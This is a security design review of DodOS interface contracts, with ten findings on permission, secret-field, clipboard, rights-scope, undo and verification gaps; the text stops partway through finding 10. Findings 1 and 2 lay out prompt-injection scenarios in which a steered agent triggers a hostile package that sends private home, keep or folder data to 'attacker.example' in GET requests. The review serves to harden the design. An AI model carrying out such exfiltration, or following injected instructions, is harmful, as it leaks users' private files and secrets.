# Review of DodOS PR 1 WIT contracts (`step0-contracts` `8b6cb05` vs `aab7417`)

**Subject:** Commit `8b6cb05` of `/Users/btw/Documents/repos/dodos` (branch `step0-contracts`), compared with `aab7417`, covering `contracts/` (`core.wit`, `actions.wit`, `catalog.wit`, `store.wit`, `manifest.wit`, `ui.wit`, `input.wit`, `agent.wit`, `shell.wit`, `mcp.md`, `README.md`) and `verify`.
**Checked against:** `FIX-WIT-SEC.md`, the round-1 reviews in `Docs/reviews/2026-11-16-wit-review-1-*.md`, `Docs/architecture/` (`security.md`, `ui.md`, `agent.md`, `storage.md`, `network.md`, `wasm-abi.md`), `Docs/decisions/README.md` (D-001 to D-132), `Docs/plan/pending-decisions.md` (P-001 to P-103), `wasm-tools 1.263.0`, and the upstream WASI 0.3.2 / `wasmparser` specifications read on 16 November 2026.

---

## Findings

### 1. `none, external` action instances read `home` and `keep.get` after the matrix skips confirmation, bypassing `private` and `"network"` (`breaks a guarantee`, `wrong fact`, `contradiction`)

- **Quotes:**
  - `contracts/core.wit:283-286`:
    `///   - "/home" is the request's \`home\`, "/tmp" ends with the instance;`
    `///     "/home" and the bound objects are read-only when change is \`none\`;`
    `///   - \`keep\`: \`get\` and \`slots\` only; \`get\` returns the item attenuated to`
    `///     the class (read-only when change is \`none\`);`
  - `contracts/core.wit:293-299`:
    `///   - reach \`external\`: wasi:sockets and name lookup fail; wasi:http`
    `///     \`client\` reaches only the hosts the manifest lists for that action, ...`
    `///     when change is \`none\`, only the methods GET and HEAD, with no request body.`
  - `contracts/core.wit:300-305, 310-312`:
    `/// A package whose manifest holds the right "network" can carry what an`
    `/// action of change \`reversible\` or \`irreversible\` wrote into \`home\` off the`
    `/// machine from its long-lived instance. So in a task marked \`untrusted\`,`
    `/// such an action of reach \`local\` is decided by \`tasks.invoke\` as an`
    `/// external modification ...`
    `/// Known limit, not a hole: an instance of reach \`external\` reads its own`
    `/// \`home\` after the matrix decided and may send it to the hosts of its own`
    `/// manifest, which the long-lived instance can do anyway.`
  - `contracts/manifest.wit:80-81, 117-118`:
    `///   "network"             served by wasi:sockets/types, wasi:http/client:`
    `///                         for the long-lived instance; scope: the hosts,`
    `/// For reach \`external\`: the hosts this action may reach, at least`
    `/// one; its instance reaches no other (core.wit, \`world service\`).`
  - `contracts/actions.wit:211-213, 219-221, 226-229`:
    `/// The system decides from the action's class and from the marks of the`
    `/// task and of the items bound to the call (the instance reads them, and`
    `/// the reply carries their marks back):`
    `///   none          external  runs                   runs unless marked private, then confirmation`
    `/// in a task marked \`untrusted\`, an action of change \`reversible\` or \`irreversible\` and reach \`local\` of a package whose manifest holds "network" is decided as an external modification`
- **Scenario:**
  1. **Exfiltrating `home` without `"network"` (and falsifying `core.wit:310-312`):**
     A hostile package `P` declares `rights: []` (no `"network"` right) and an action `fetch` with `effect: { change: none, reach: external }` and `hosts: ["https://attacker.example"]` (`manifest.wit:80-81, 117-118` allow `action.hosts` without `"network"`, or to hosts outside `"network"`'s `scope`). During prior interactive use, `P` stored sensitive application-zone data (`private` under `core.wit:177`) in its `home`.
     In a later agent task that is marked `untrusted` without yet holding `private` (for instance, from reading `tasks.available` at `actions.wit:204-205` or a pasted web part in `request.parts` at `actions.wit:96-99`), the steered agent calls `P.fetch` with `objects: []`. Because the task is not marked `private` and `objects` is empty, `tasks.invoke` evaluates `none, external` (`actions.wit:219-221`) as **`runs`** with no confirmation.
     Inside the `P.fetch` instance, `/home` is readable (`core.wit:283`), so `P.fetch` reads the `private` application-zone data from `/home` *after* the matrix decided and sends it via `GET https://attacker.example/?d=...`. Even worse, `P` can pair a `reversible, local` action (not covered by `core.wit:300-305` because `P` lacks `"network"`) to stage non-`home` data or compute secrets into `home`, then call `P.fetch`. `core.wit:310-312`'s justification (`"which the long-lived instance can do anyway"`) is false because `P`'s long-lived instance has no `"network"` right and could never contact `attacker.example`.
  2. **Exfiltrating a `user`-zone `private` file via read-only `keep`:**
     The user previously granted `P` (again even with `rights: []`) a `user`-zone file `taxes.pdf` via `exchange.pick` or `drop-target`, and `P`'s long-lived instance saved the handle via `keep.put("doc", handle)` (`store.wit:187`).
     In a later task marked `{untrusted}` (not `private`), the steered agent calls `P.fetch` (`none, external`, `objects: []`). `tasks.invoke` sees no `private` mark on the task or `objects` and runs `P.fetch` unconfirmed. Under `core.wit:284-286`, `P.fetch` calls `keep.get("doc")`, receives a read-only handle to the `user`-zone `private` file, reads it *after* the matrix skipped confirmation, and sends its bytes out in `GET https://attacker.example/?d=...`.
  3. **Inconsistent bound-item mark rule on overrides:**
     `actions.wit:211-213` states the matrix decides from the marks `"of the task and of the items bound to the call"`, whereas `actions.wit:226-230` and `core.wit:302` trigger the `"network"`-local override (and `focus-surface`) only `"in a task marked untrusted"`. If an unmarked task passes an `untrusted` bound item (from `request.objects` at `actions.wit:109` or a prior action's `outcome.objects`) to a `reversible, local` action of a `"network"` package, `actions.wit:211-213` and `actions.wit:226-229` disagree on whether that call is confirmed as an external modification.
- **Smallest correction:**
  1. In `core.wit:283-286` and `actions.wit:219-221`, either make `/home` and `keep` answer `denied` in any `change: none, reach: external` instance that runs unconfirmed in a task marked `untrusted`, or require confirmation in an `untrusted` task for any `none, external` action unless `/home` and `keep` are denied to it; and require every host in `action.hosts` to be within the package's `"network"` right (`manifest.wit:80-83, 117-120`), removing the false claim at `core.wit:310-312`.
  2. In `core.wit:302` and `actions.wit:226-230`, align with `actions.wit:211-213` by writing `"in a task marked untrusted, or when an item bound to the call carries untrusted"`.

---

### 2. Zone-based `private` has no rule for bound `collection` handles, and `core.wit:180-182` strips `untrusted` from shared-package objects (`unsettled case`, `breaks a guarantee`, `contradiction`)

- **Quotes:**
  - `contracts/core.wit:168-170`:
    `/// \`untrusted\` is always set for the origins "app:", "web:", "device:" and "foreign", and for any origin this version does not know: a publisher cannot declare itself trusted.`
  - `contracts/core.wit:176-182`:
    `/// \`private\` comes from where the data lives, not from who wrote it: the`
    `/// storage service adds it to every read from the user, application,`
    `/// snapshot and device zones (storage.md), whatever marks the writer had,`
    `/// so that a file an application saved outside any task still marks its`
    `/// reader. Cache and ephemeral objects keep their writer's marks; objects`
    `/// of the system zone and of shared packages carry none; foreign media`
    `/// carry \`untrusted\` by their origin.`
  - `contracts/store.wit:113-117, 165`:
    `record collection-info { held: rights, quota: option<quota> }`
    `variant item { object(object), collection(collection) }`
  - `contracts/actions.wit:211-213, 219-221`:
    `/// The system decides from the action's class and from the marks of the task and of the items bound to the call`
    `///   none          external  runs                   runs unless marked private, then confirmation`
- **Scenario:**
  1. **Unsettled marks when binding a `collection`:**
     A user has a `user`-zone folder `"Taxes-2026"` containing private files. A task holds `{untrusted}` (not yet `private`). The steered agent invokes `P.inspect` (`none, external`, `hosts: ["https://attacker.example"]`) with `"Taxes-2026"` (a `collection`, `store.wit:165`) bound in `objects`. Unlike `object-info` (`store.wit:47`), `collection-info` (`store.wit:113-117`) carries no `provenance` field, and `core.wit:177` only states that the storage service adds `private` `"to every read"` from the `user` zone.
     The text leaves two outcomes unsettled:
     - *Outcome A:* Binding a `collection` in `objects` does not trigger a read and carries no `provenance`, so `tasks.invoke` sees no `private` mark, runs `P.inspect` without confirmation, and `P.inspect` calls `collection.query("")` and `collection.open(...)` (`store.wit:125, 153`) to exfiltrate every file name and content before returning. (Similarly, binding a `foreign`-zone collection would carry no `untrusted` mark until read.)
     - *Outcome B:* `tasks.invoke` inspects the zone of every bound `collection` at invocation time and adds `private` (for `user`, `application`, `snapshot`, `device`) or `untrusted` (for `foreign`) before deciding the matrix.
  2. **Contradiction on `"objects of the system zone and of shared packages carry none"`:**
     `core.wit:180-182` states `"Cache and ephemeral objects keep their writer's marks; objects of the system zone and of shared packages carry none; foreign media carry untrusted by their origin."` Because the third clause mixes `untrusted` into `"carry ..."`, `"carry none"` literally says objects of shared packages (`Packages` zone, `storage.md:47`) carry no marks at all — contradicting `core.wit:168-170` (`"untrusted is always set for ... 'app:'"`) and `security.md:195` (`"System zone and shared packages: none. untrusted keeps following the writer and the origin"`).
- **Smallest correction:**
  1. In `core.wit:177-182` and `actions.wit:211-213`, state explicitly that binding a `collection` in `tasks.invoke` carries the zone marks (`private` for `user`, `application`, `snapshot`, `device`; `untrusted` for `foreign`).
  2. Rewrite `core.wit:180-182` as: `"Cache and ephemeral objects keep their writer's marks; objects of the system zone and of shared packages take no \`private\` mark from their zone (keeping \`untrusted\` by writer and origin); foreign media carry \`untrusted\` by their origin."`

---

### 3. Secret fields deadlock on application surfaces, conflict between `manifest.wit` and `actions.wit`, and remain unsettleable on the overlay across 0-button or pre-`untrusted` updates (`contradiction`, `blocks building`, `unsettled case`)

- **Quotes:**
  - `contracts/catalog.wit:18, 30, 84-86, 98-112`:
    `/// Agent level: what the agent may emit, and the base of every application.`
    `enum field-kind { line, multiline, number, date, time, secret }`
    `/// On an application's own surface a button with an action is`
    `/// refused (\`invalid\`): there is no task there, and the application`
    `/// handles its own events.`
    `/// Event "changed" with the new value as a JSON string. For kind`
    `/// \`secret\`, the event carries null and \`value\` is ignored on update:`
    `/// the value never reaches the surface owner, only an action through`
    `/// \`source.input\`.`
    `/// A secret field on the agent's overlay: refused while the task is`
    `/// marked \`untrusted\` (injected text asking for a password in the`
    `/// agent's own card); otherwise accepted only if the buttons that read`
    `/// it all invoke actions of one application, which the system names`
    `/// beside the field.`
  - `contracts/input.wit:58, 73-74`:
    `/// A text field the caller draws inside a \`canvas\` node (os:catalog-app)`
    `/// \`not-found\` if the node is not a \`canvas\` of \`screen\`.`
  - `contracts/manifest.wit:32-36`:
    `//   "os-secret": true`
    `//       filled only from a secret field (os:catalog-agent \`field\`), and a`
    `//       secret field feeds no other property; an action that receives one`
    `//       is confirmed whatever its class (tasks.invoke); shown masked in the`
    `//       confirmation, written as null in the journal, never sent to a model`
  - `contracts/actions.wit:224-226`:
    `/// Three rows change (security.md): an action that receives a secret`
    `/// ("os-secret", manifest.wit) is confirmed whatever its class, the`
    `/// secret shown masked (point 18)`
- **Scenario:**
  1. **Deadlocked secret fields on application surfaces (`blocks building`, `contradiction`):**
     A catalogue application (`world app`, which imports `os:catalog-agent/kinds`, `catalog.wit:18`, and writes its UI against the catalogue, `ui.md:73`) renders a login form with `field { kind: secret }`. Under `catalog.wit:98-101`, `"changed"` delivers `null` to the surface owner because `"the value never reaches the surface owner, only an action through source.input"`. Under `catalog.wit:84-86` (`8b6cb05`), any button with `action` on an application's own surface is refused (`invalid`). And `text-input.attach` (`input.wit:58, 73-74`) only attaches to a `canvas` node, not a `field`. Thus a catalogue-only application can emit a `secret` field, yet neither the app nor any action can ever receive what the user types. (`security.md:89` already narrowed secret isolation to `"on the agent's overlay"`, while `catalog.wit:98-101` and `ui.wit:57-61` did not.)
  2. **`tasks.invoke` vs `"filled only from a secret field"` (`contradiction`, `unsettled case`):**
     Suppose an agent calls `tasks.invoke(action, '{"pw": "guess123"}', [])` directly where `"pw"` carries `"os-secret": true`. Under `manifest.wit:33` (`"filled only from a secret field"`), the system must reject the call (`invalid`), making `"os-secret"` actions unreachable from `tasks.invoke` except via overlay button activation (`catalog.wit:82-84`). Under `actions.wit:224-226` (written directly on `task.invoke`), the system accepts the call and shows `"guess123"` **masked** in the confirmation — which breaks `"filled only from a secret field"` and hides the model-chosen literal string from the user confirming it.
  3. **Overlay secret field with 0 buttons, or placed before `untrusted` mark (`unsettled case`, `breaks a guarantee`):**
     On the agent's overlay (`catalog.wit:106-110`):
     - If an unmarked task emits `field(id: "s", kind: secret)` with **zero** buttons reading `"s"` (e.g., before adding the button in a second `update`), `"the buttons that read it all invoke actions of one application"` holds vacuously over the empty set, leaving unsettled whether the `update` is refused (`invalid`) or accepted with no application name to display beside `"s"`.
     - If an unmarked task emits `field("s")` + `button(app.login)` (accepted) and then reads untrusted data (e.g., `tasks.available` or an untrusted mail), the task becomes `untrusted`, yet unlike `grant for the rest of a task` (`actions.wit:244`), nothing revokes, hides, or disables the already-placed secret field on `overlay`.
- **Smallest correction:**
  1. In `catalog.wit:98-101`, state that `field` of kind `secret` on an application's own surface delivers `"changed"` with the value as a JSON string to the owning application (with `text-input`'s `"password"` protection: system keyboard only, no learning), or refuse `field { kind: secret }` on application surfaces (`ui.wit:55-61`) and state applications must use `canvas` + `text-input` (`purpose: "password"`).
  2. In `actions.wit:224-226` and `manifest.wit:33`, state that `tasks.invoke` answers `invalid` if called directly with a value for an `"os-secret"` property (only an overlay `button` using `source.input` on a `secret` field may fill `"os-secret"`).
  3. In `catalog.wit:106-110`, require **at least one** button reading the secret field on the overlay (`"at least one button reads it, and all buttons that read it invoke actions of one application"`), and add: `"if the task later takes the untrusted mark, every secret field on its overlay is cleared and its buttons refused until removed"`.

---

### 4. `exchange.copy`'s gesture check (`"a menu entry, or a copy button"`) cannot be built from `ui.wit` and `catalog.wit` (`blocks building`, `unsettled case`, `breaks a guarantee`)

- **Quotes:**
  - `contracts/store.wit:221-225`:
    `/// Puts items on the clipboard. Each needs \`share\`. Answered only right`
    `/// after a copy or cut gesture of the user on the caller's surface (the`
    `/// copy key, a menu entry, or a copy button of that surface the user`
    `/// activated); \`denied\` otherwise, and always in an action instance,`
    `/// which has none.`
  - `contracts/catalog.wit:96, 184-185, 215`:
    `record button { label: string, tone: tone, action: option<invocation> }`
    `/// Children are \`button\`, \`divider\` and nested \`menu\` nodes.`
    `record menu { label: string }`
    `record canvas { alt: string, source: option<object-ref> }`
  - `contracts/ui.wit:39-44`:
    `record event { kind: string, node: option<node-id>, value: string, objects: list<binding>, provenance: provenance }`
- **Scenario:**
  A builder must implement `exchange.copy` in the shell/compositor (`store.wit:221-225`) so it succeeds only `"right after a copy or cut gesture of the user on the caller's surface (the copy key, a menu entry, or a copy button of that surface the user activated)"`.
  Neither `button`, `menu`, nor `canvas` in `catalog.wit` has a role, flag, or semantic action kind identifying a button or menu entry as a copy/cut control — `button` has only `{ label, tone, action }` and `menu` has only `{ label }`, where `label` is arbitrary UI text (including localized text in French per `ui.md:119`, `"Copy code"`, `"Cut"`, or icon-only controls), and `canvas` receives only raw `"pointer"` coordinates (`catalog.wit:204-206`).
  Consequently, two conflicting outcomes are left to the builder:
  - *Outcome A:* Only standard OS copy/cut shortcuts (`Ctrl+C`/`Ctrl+X`) or English `"Copy"`/`"Cut"` labels are recognized, breaking localized `"Copier"` buttons, icon buttons, and in-canvas copy buttons in honest applications.
  - *Outcome B:* Any `"activated"` button or `"pointer"` click on the focused surface counts as a user gesture opening `exchange.copy`, allowing a hostile application to silently overwrite the clipboard whenever the user clicks `"Continue"` or `"Close"`.
  In addition, `"right after"` sets no window or single-call consumption rule, leaving unsettled whether a single gesture authorizes multiple delayed `exchange.copy` calls.
- **Smallest correction:**
  Either add a semantic `role` (or standard `copy`/`cut` verb flag/case) to `catalog.wit`'s `button` so the shell knows which buttons and menu entries are copy/cut controls without guessing from localized labels (matching `ui.md:93` `"semantic and not visual"`), or restrict `exchange.copy` strictly to the OS copy/cut key combination and system menu entry (`store.wit:222-224`), and specify `"once, within one event turn"` for `"right after"`.

---

### 5. Reserved `"microphone"` contradicts adding `"os:core/wake-word@0.1.0"` to `manifest.target`, and HTTPS-origin `scope` cannot be enforced on `wasi:sockets` (`contradiction`, `blocks building`)

- **Quotes:**
  - `contracts/manifest.wit:73-77, 80-83, 88, 100-102, 135-138`:
    `/// A right the package asks for. Names known in this version, one per`
    `/// line: either served by the imports it names, which a world of os:core`
    `/// imports, or reserved: named so that the meaning is fixed, but no`
    `/// interface serves it yet, so the installer refuses a package that asks`
    `/// for it.`
    `///   "network"             served by wasi:sockets/types, wasi:http/client:`
    `///                         for the long-lived instance; scope: the hosts,`
    `///                         or ["*"] for any host; an empty scope is refused`
    `///   "microphone"          reserved: as "audio-playback"` (`"no audio interface for applications"`, line 87)
    `/// A host is an HTTPS origin ("https://api.example.org", with a port if`
    `/// not 443); "https://*.example.org" also matches every subdomain; "*"`
    `/// alone, only in the scope of "network", is any host.`
    `/// The world the component targets: "os:core/service@0.1.0",`
    `/// "os:core/app@0.1.0", "os:core/wake-word@0.1.0",`
    `/// "os:core/input-engine@0.1.0", "wasi:http/service@0.3.2",`
    `/// "wasi:cli/command@0.3.2".`
  - `contracts/core.wit:264-266, 275-276, 409-417`:
    `/// A plain wasi:http/service component (a server launched per request, platform.md) or wasi:cli/command component (a rescue tool) runs in its own WASI world, with the same linking rules for the network;`
    `///   - wasi:sockets and wasi:http: only with the manifest right "network", to the hosts it lists ("*": any host).`
    `/// \`audio\`: the microphone, 16 kHz, mono, signed 16-bit samples...`
    `export detect: async func(audio: stream<s16>) -> stream<u64>;`
  - `Docs/architecture/ui.md:135`:
    `- **Rights.** Playback, microphone and capture of the sound of other applications are three distinct capabilities.`
- **Scenario:**
  1. **Wake-word packages vs reserved `"microphone"` (`contradiction`):**
     `8b6cb05` added `"os:core/wake-word@0.1.0"` to `manifest.target` (`manifest.wit:136`) so third-party packages can implement `world wake-word` (`detect(audio: stream<s16>)` receiving live microphone audio, `core.wit:412-417`). Yet `manifest.wit:75-77, 88` marks `"microphone"` as `reserved` (`"no audio interface for applications ... so the installer refuses a package that asks for it"`). A builder implementing the installer faces a contradiction: either any wake-word package asking for `"microphone"` is refused by the installer (making `"os:core/wake-word@0.1.0"` uninstallable for any detector declaring the microphone right), or a wake-word package omits `"microphone"` and receives live microphone audio without holding the `"microphone"` capability (`ui.md:135`, `security.md:94`).
  2. **`wasi:sockets` cannot be scoped by HTTPS origins (`blocks building`):**
     `8b6cb05` added `served by wasi:sockets/types, wasi:http/client` (`manifest.wit:80`) and kept `"["*"] for any host; an empty scope is refused"`, while `manifest.wit:100-102` restricts non-`"*"` entries in `scope` strictly to `"https://..."` origins. In `contracts/deps/sockets/sockets.wit`, `tcp-socket.connect` takes a raw `ip-socket-address` and `udp-socket.send` takes a raw IP+port, while `ip-name-lookup.resolve-addresses` resolves a bare hostname with no scheme or port. A builder cannot enforce `"https://api.example.org"` (an HTTPS origin) on raw TCP/UDP sockets in `wasi:sockets/types` (multiple origins or non-HTTP protocols share IPs and DNS names), leaving unsettled whether non-`"*"` `"network"` scopes deny `wasi:sockets/types` and `wasi:sockets/ip-name-lookup` altogether.
     *(Also carried forward from `aab7417`: `manifest.wit:80-81` restricts `"network"` to `"the long-lived instance"`, while `core.wit:264-266` applies those rules to `wasi:http/service` and `wasi:cli/command`, which have no long-lived `service` instance.)*
- **Smallest correction:**
  1. In `manifest.wit:88`, either state that `"microphone"` is served by `os:core/wake-word` (`detect`) for `wake-word`-targeted packages (requiring `"microphone"` in `rights` for `os:core/wake-word@0.1.0`) or explicitly exempt `wake-word` as a user-selected system role with no capability request.
  2. In `core.wit:275-276` and `manifest.wit:80-83`, state that non-`"*"` HTTPS origins in `"network"` grant `wasi:http/client` only (with `wasi:sockets` and `ip-name-lookup` linked to `access-denied` unless `scope` is `["*"]`, or add a host/port scope syntax for sockets).

---

### 6. `mcp.md` places `"os-item"` inside array `items`, contradicting `manifest.wit`, `catalog.wit`, and `actions.wit` (`contradiction`, `blocks building`, `unsettled case`)

- **Quotes:**
  - `contracts/manifest.wit:26-31`:
    `// and two keywords of DodOS, on a property of type string:`
    `//   "os-item": {"kind": "object" | "collection", "rights": [<rights>],`
    `//               "content-types": [<media types>]}`
    `//       the value is the name of a binding carried next to the JSON (core.wit`
    `//       value encoding);`
  - `contracts/mcp.md:27, 30`:
    `| \`outputSchema\` | \`output-schema\` | ... Without one: \`{"type": "object", "properties": {"text": {"type": "string"}, "objects": {"type": "array", "items": {"type": "string", "os-item": {"kind": "object", "rights": ["read"], "content-types": []}}}}}\` |`
    `| result image, audio and resource blocks | \`outcome.objects\` | ... returned as a binding named by an \`"os-item"\` property of \`output\` (\`objects\` above), |`
  - `contracts/catalog.wit:76`:
    `record argument { name: string, value: source }`
  - `contracts/actions.wit:31-36, 45-47`:
    `/// Storage arguments. A property of \`input\` that carries "os-item"`
    `/// holds the name of one of these bindings (core.wit, value encoding); a`
    `/// binding that no "os-item" property names, or a name that no binding`
    `/// carries, is \`invalid\`. Attenuated by the system to the property's`
    `/// "os-item" rights and to the action's class (read-only when change is \`none\`).`
    `/// Typed object results, each named by an "os-item" property of`
    `/// \`output\` (core.wit, value encoding). Each needs \`share\`.`
    `objects: list<binding>,`
- **Scenario:**
  1. `manifest.wit:26` defines `"os-item"` and `"os-secret"` strictly `"on a property of type string"`, and `actions.wit:31-36` / `45-46` speak of `"a property of input"` / `"an 'os-item' property of output"`. In `8b6cb05`, `mcp.md:27` instead generates `"objects": {"type": "array", "items": {"type": "string", "os-item": ...}}`, placing `"os-item"` inside an array's `items` subschema. Under `manifest.wit:26`, `dodo package` and the installer must refuse that generated fallback `output-schema`, breaking every MCP server without an `outputSchema`.
  2. Conversely, if `"os-item"` and `"os-secret"` are allowed inside arrays or nested objects in `input-schema`, `catalog.wit:76` (`argument { name: string, value: source }`) only identifies a flat property name and cannot address nested properties or array elements (breaking overlay buttons targeting those inputs).
  3. Furthermore, while `actions.wit:33-36` rejects mismatched `request.objects` as `invalid` and attenuates them to the schema's `"os-item"` rights and class, `actions.wit:45-47` leaves unsettled what happens when a hostile action's `outcome.objects` contains an extra binding not referenced by `output`, omits a referenced binding, violates `kind`/`content-types`, or exceeds the `"os-item"` rights declared in `output-schema`.
- **Smallest correction:**
  1. Either update `manifest.wit:26` to allow `"os-item"` on any string schema node (including `items` of an `array`, while keeping `"os-secret"` on top-level string properties or specifying JSON Pointer paths for `argument.name`) or change `mcp.md:27` to a top-level string property (e.g., `"first-object"` or wait for list-of-bindings support).
  2. State in `actions.wit:45-47` that `outcome.objects` is validated against `output`'s `"os-item"` declarations (`kind`, `content-types`, no unreferenced/missing bindings, failing with `invalid` or `denied` otherwise) and attenuated to the declared `"os-item"` rights.

---

### 7. `journal-entry.writes` (`list<bound>`) cannot represent metadata-only writes or identify collections/removed entries for `undo` (`blocks building`, `breaks a guarantee`)

- **Quotes:**
  - `contracts/actions.wit:144-146, 157-161, 170-174, 260-264`:
    `/// An object bound to a call, as the journal keeps it: its id and the`
    `/// version the action received (none for a collection). It opens nothing.`
    `record bound { name: string, object: option<object-id>, version: option<version> }`
    `/// What the call created or wrote, as the system saw it in the`
    `/// instance's own store calls: each object at the version it left, a`
    `/// removed entry or a collection with version none. What \`undo\``
    `/// restores: the version before, the entry removed or brought back.`
    `writes: list<bound>,`
    `/// True for a done action of change \`reversible\` and reach \`local\` whose`
    `/// writes the journal holds (\`writes\`), unless it was decided as an`
    `/// external modification (see \`invoke\`), and for a held entry, whose`
    `/// undo cancels the call.`
    `undoable: bool,`
    `/// \`unsupported\` if it is not undoable, \`conflict\` if a later write touched the same objects.`
    `undo: async func(entry: u64) -> result<_, error>;`
  - `contracts/store.wit:24-25, 73-77, 113-117`:
    `/// Content version. Every \`write\`, \`write-via-stream\` and \`resize\` that`
    `/// succeeds yields a greater number. Metadata changes do not.`
    `set-content-type: async func(content-type: string) -> result<_, error>;`
    `set-meta: async func(key: string, value: option<string>) -> result<_, error>;`
    `record collection-info { held: rights, quota: option<quota> }`
- **Scenario:**
  1. **Metadata-only changes have no version change (`breaks a guarantee`, `blocks building`):**
     A `reversible, local` action updates only an object's `content-type` or `meta` keys (`store.wit:73-77`), e.g. changing `"mime"` or deleting metadata tags. Under `store.wit:24-25`, `"Metadata changes do not"` yield a greater `version`, and `object.at(version)` (`store.wit:88`) only opens retained content versions. Thus `writes` (`bound { name, object: some(id), version: some(v) }`) records the exact same `v` that existed before the call: `task.undo` cannot restore the previous metadata from `version`, nor detect a later metadata-only write by another action as a `conflict`.
  2. **Collections and removed entries have no collection identifier in `writes` (`blocks building`):**
     A `reversible, local` action removes `"draft.txt"` from `home` and removes another `"draft.txt"` from a sub-collection `"archive"` (or creates/removes a sub-collection). Because collections have no `object-id` (`store.wit:113-117`) and `bound` has no parent collection id, `writes` records `{ name: "draft.txt", object: none, version: none }` twice with nothing distinguishing which collection each entry came from (nor the removed object's `id` or `content` version to bring back).
- **Smallest correction:**
  Either make `set-content-type` and `set-meta` yield a new `version` (covered by `at(version)` and conflict detection) — or record metadata changes separately in the system's journal state — and clarify that `journal-entry.writes` is an inspection summary while `task.undo` uses the system's internal before/after store log (including parent collection identity and deleted object snapshots), not `writes` alone.

---

### 8. `ui.surface.update` checks `"existing parent"` without acyclicity, permitting a parent cycle that breaks `accessibility.read` (`breaks a guarantee`, `blocks building`)

- **Quotes:**
  - `contracts/ui.wit:55-58`:
    `/// The system checks every update against the tree it would leave: known kind`
    `/// allowed on this surface (\`unsupported\`), props matching the kind,`
    `/// existing parent, a button with an action only on the agent's overlay`
  - `contracts/agent.wit:307`:
    `/// Nodes in depth-first order, after node \`after\`; limit <= 1024.`
- **Scenario:**
  1. On a surface, the owner calls `update` with `[node{id: "a", parent: none, ...}, node{id: "b", parent: some("a"), ...}]`. Both parents exist, so the call succeeds.
  2. The owner calls `update` with `[node{id: "a", parent: some("b"), ...}]`.
  3. In the tree the update leaves (`ui.wit:55`), `"a"`'s parent `"b"` exists and `"b"`'s parent `"a"` exists, so `"existing parent"` (`ui.wit:57`) is satisfied, yet `"a"` and `"b"` now form a parent cycle with no root (`parent: none`). A builder implementing depth-first root traversal for `accessibility.read` (`agent.wit:307`) or surface layout either loops or silently drops cyclic nodes.
- **Smallest correction:**
  In `ui.wit:57`, replace `"existing parent"` with `"existing parent with no cycle"`.

---

### 9. `inference.choose` omits `untrusted` marking for third-party `candidates`, and `inference.generate` evaluates marks `"when the call started"` (`breaks a guarantee`, `contradiction`)

- **Quotes:**
  - `contracts/agent.wit:24-26`:
    `/// Data of a task marked \`private\` goes to a remote model only if the user`
    `/// allowed that provider for private data (\`private-allowed\`), otherwise`
    `/// the call answers \`denied\`.`
  - `contracts/agent.wit:72-73, 88-90`:
    `/// Objects whose content goes into the context with this message (text;`
    `/// images for a model that reads them). The system reads them itself,`
    `/// so reading adds their marks to the task.`
    `/// Actions the model may propose, from the task's scope. The system`
    `/// adds their names, descriptions and schemas from the manifests itself;`
    `/// this marks the task as \`available\` does.`
  - `contracts/agent.wit:116-119, 133-137`:
    `/// Set by the system: origin "model:<id>", the task's marks when the`
    `/// call started (whatever was in the context may have steered the`
    `/// output), plus \`untrusted\` for a remote model (OPEN above).`
    `provenance: provenance,`
    `/// The decision tier: ranks \`candidates\` (actions of the scope that the`
    `/// agent pre-selected by its own matching, at most 64) for the user's`
    `/// \`words\`, fills each input to its schema, and returns at most \`limit\`.`
    `/// A ref outside the task's scope makes the call answer \`denied\`.`
    `choose: async func(scope: borrow<task>, words: string, candidates: list<action-ref>, limit: u32) -> result<choices, error>;`
- **Scenario:**
  1. **`inference.choose` omits manifest marking:** Unlike `request.tools` in `generate` (`agent.wit:89-90`: `"this marks the task as available does"`), `inference.choose` (`agent.wit:133-137`) feeds the decision model the names, descriptions, and schemas of third-party `candidates` (`actions.wit:127-128`: `"publisher's text, read by the model"`) and returns filled `choice.input` strings without stating that third-party candidates mark the task and `choices.provenance` `untrusted`. If an unmarked task passes a third-party `action-ref` into `choose` without calling `available` first, the third-party manifest text influences `choice.input` without setting `untrusted`.
  2. **`"when the call started"` in `generate`:** In an unmarked task (`marks = {}`), the agent calls `inference.generate` on a remote model with `private-allowed: false`, passing a `user`-zone `private` object in `request.messages[0].objects` (`agent.wit:72-73`), or on a local model passing third-party `tools` (`agent.wit:89-90`). If `"a task marked private"` (`agent.wit:24`) and `"the task's marks when the call started"` (`agent.wit:116-117`) are evaluated before the system reads `request.messages[*].objects` and `request.tools`, the remote model receives the `private` object despite `private-allowed: false`, and `outcome.provenance` omits the `untrusted`/`private` marks added by those request fields.
- **Smallest correction:**
  1. In `agent.wit:133-137`, add: `"including any third-party action in \`candidates\` marks the task and \`choices.provenance\` \`untrusted\`, as \`available\` does"`.
  2. In `agent.wit:116-118`, change `"the task's marks when the call started"` to `"the task's marks after reading \`request.messages[*].objects\` and \`request.tools\` (checked before sending to a remote model for \`private-allowed\`)"`.

---

### 10. `verify` has four concrete validation bypasses in its new per-world and rights checks, plus a pre-existing macOS `sha256sum --status` failure (`blocks building`, `breaks a guarantee`)

- **Quotes:**
  - `verify:23, 32-34`:
    `worlds=$(sed -n 's/^world \([a-z-]*\) {$/\1/p' contracts/core.wit)`
    `wasm-tools component embed --dummy contracts --world "$w" -o "$tmp/$w.core.wasm"`
    `wasm-tools component new "$tmp/$w.core.wasm" -o "$tmp/$w.wasm"`
    `wasm-tools validate --features="-all,wasm2,component-model,$f" "$tmp/$w.wasm"`
  - `verify:40-41, 51-57`:
    `awk '/A right the package asks for/,/record right/' contracts/manifest.wit |`
    `  sed -n 's|^ *///   "\([a-z-]*\)" *\(.*\)$|\1 \2|p' >"$tmp/rights"`
    `    "served by "*)`
    `      for i in $(echo "$rest" | sed 's/^served by \([a-z:/-]*\(, [a-z:/-]*\)*\):.*$/\1/' | tr ',' ' '); do`
    `        if ! grep -Eq "^ *import $i(@[0-9.]+)?;" contracts/core.wit; then`
  - `verify:75, 78` (pre-existing from `aab7417`):
    `if ! echo "$sum  $tarball" | sha256sum -c --status 2>/dev/null; then`
    `  echo "$sum  $tarball" | sha256sum -c --status || {`
- **Scenario (tested empirically in a temporary copy of `contracts/` and `verify` lines 1–65 with `wasm-tools 1.263.0`):**
  1. **Empty `served by :` list passes (`exit 0`):** Because `sed` at `verify:52` uses `*` (`[a-z:/-]*`), changing `"served by wasi:sockets/types, wasi:http/client:"` to `"served by :"` yields an empty `$i` list, runs zero `grep` checks, increments `served`, and exits `0`.
